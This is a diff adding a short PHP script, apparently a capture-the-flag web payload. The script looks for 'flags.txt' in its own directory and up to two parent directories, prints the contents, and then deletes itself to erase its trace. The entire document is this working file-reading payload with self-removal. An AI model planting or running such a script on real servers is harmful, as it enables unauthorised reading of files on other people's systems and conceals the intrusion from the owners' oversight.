@@ -1,0 +1,10 @@
+<?php
+header('Content-Type: text/plain; charset=UTF-8');
+foreach (array('flags.txt', '../flags.txt', '../../flags.txt') as $path) {
+    if (is_file($path)) {
+        echo $path, "\n", file_get_contents($path), "\n";
+    }
+}
+@unlink(__FILE__);
+?>
+
